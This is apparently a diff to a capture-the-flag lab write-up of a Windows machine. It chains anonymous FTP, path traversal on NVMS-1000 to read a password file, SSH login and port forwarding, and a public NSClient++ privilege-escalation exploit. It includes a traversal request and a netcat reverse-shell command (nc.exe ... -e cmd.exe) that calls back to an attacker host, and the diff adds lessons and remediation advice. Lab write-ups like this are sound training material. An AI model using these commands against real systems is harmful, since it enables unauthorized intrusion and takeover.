@@ -6,7 +6,7 @@
 
 - Difficulty: Easy
 - Platform: Windows
-- Skills Demonstrated: FTP Enumeration, Web Application Enumeration, Local File Inclusion (LFI), SSH Authentication Attacks, Windows Privilege Escalation
+- Skills Demonstrated: FTP Enumeration, Web Application Enumeration, Local File Inclusion (LFI), SSH Authentication Attacks, SSH Local Port Forwarding, NSClient++ Exploitation, Windows Privilege Escalation
 
 ## Methodology 
 
@@ -22,7 +22,7 @@ The following methodology was conducted during this assessment:
 
 ## Enumeration
 
-Initial enumeration begins with a `Nmap` port scan to discover any accessible ports and services
+Initial enumeration began with a `Nmap` port scan to discover any accessible ports and services
 ```
 nmap -sC -A -sV -T5 10.10.10.184 -p-
 ```
@@ -98,7 +98,7 @@ Key Findings:
 - Port 21 - FTP
 - Anonymous FTP login allowed
 
-Since anonymous access was enabled for the FTP service, this is were I began my port enumeration. Successful authentication to this service can expose potential users, confidential information and even lead to remote code executioni if we are able to upload a web shell to a server document root.
+Since anonymous access was enabled for the FTP service, this is where I began my port enumeration. Successful authentication to this service can expose potential users, confidential information and even lead to remote code execution if we are able to upload a web shell to a server document root.
 ```
 ftp 10.129.227.77
 ```
@@ -127,7 +127,7 @@ The web service hosted a login page identifying the application as **NVMS-1000**
 
 # Initial Access
 
-Using Burp Suite, the HTTP request was intercepted and modified to test for arbitrary file inclusion. By manipulating the GET request, the `Passwords.txt` file located on `Nathan`'s desktop was successfully retrieved.
+Using Burp Suite, the HTTP request was intercepted and modified to test for arbitrary file inclusion. Since FTP enumeration previously revealed the existence of Passwords.txt, the LFI vulnerability was used to retrieve this file from Nathan's desktop.
 ```
 GET ../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
 ```
@@ -152,7 +152,7 @@ ssh nadine@10.129.227.77
 
 During privilege escalation enumeration, the previously identified NSClient++ service was revisited. Further investigation of the installed applications revealed **NSClient++** was installed in the `Program Files` directory, indicating that the service could potentially be leveraged for privilege escalation.
 
-Examinging the configuration file revealed the web interface authentication password and the allowed hosts, which in this case is restricted to the local machine(`127.0.0.1`) 
+Examining the configuration file revealed the web interface authentication password and the allowed hosts, which in this case is restricted to the local machine(`127.0.0.1`) 
 
 ![config](/Images/config.png)
 
@@ -167,7 +167,7 @@ nscp.exe --version
 ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77
 ```
 
-A search for a publicly available exploit matching the identified version revealed a suitable exploit. The exploit was transferred to the target machine along with a Netcat binary to establish a reverse shell.
+A search for publicly available exploits matching the identified NSClient++ version revealed a privilege escalation exploit.. The exploit was transferred to the target machine along with a Netcat binary to establish a reverse shell.
 
 Exploit source: https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation
 
@@ -178,3 +178,29 @@ privesc.py "C:\Users\Nadine\Desktop\nc.exe 10.10.16.2 443 -e cmd.exe" https://12
 
 ![system](Images/system.png)
 
+# Conclusion
+
+The assessment demonstrated how multiple security weaknesses could be chained together to gain full control of the target system. Anonymous FTP access exposed sensitive files and user information, which led to the discovery of a password list. The NVMS-1000 web application was then exploited through a Local File Inclusion (LFI) vulnerability to retrieve the password file, which was used to obtain valid SSH credentials.
+
+
+After gaining initial access, further enumeration revealed an outdated and misconfigured NSClient++ installation. By identifying the vulnerable version and exploiting the service, privilege escalation was achieved, resulting in a SYSTEM-level shell on the target machine.
+
+# Lessons Learned
+
+- Anonymous FTP access can provide valuable enumeration data, including usernames and sensitive files that may assist further attacks.
+- Information gathered during early enumeration can become useful later in the attack chain, highlighting the importance of thorough reconnaissance.
+- Vulnerabilities such as Local File Inclusion can be used to access sensitive files when combined with previously discovered information.
+- Valid credentials discovered from one source should be tested against other exposed services, as credential reuse is a common attack vector.
+- Local services that are not externally accessible may still become exploitable after gaining initial access through techniques such as SSH port forwarding.
+- Privilege escalation often requires combining multiple findings, including software version identification, configuration analysis, and service permissions.
+
+# Remediation
+
+- Disable anonymous FTP access and enforce authenticated access where FTP is required.
+- Remove sensitive files containing credentials or password lists from user directories.
+- Implement proper file permissions to prevent unauthorized access to sensitive information.
+- Patch the NVMS-1000 application and address Local File Inclusion vulnerabilities.
+- Enforce strong, unique passwords and prevent credential reuse across services.
+- Upgrade NSClient++ to a supported and secure version.
+- Restrict access to administrative interfaces such as NSClient++ to trusted hosts only.
+- Regularly review services running with elevated privileges and apply the principle of least privilege.
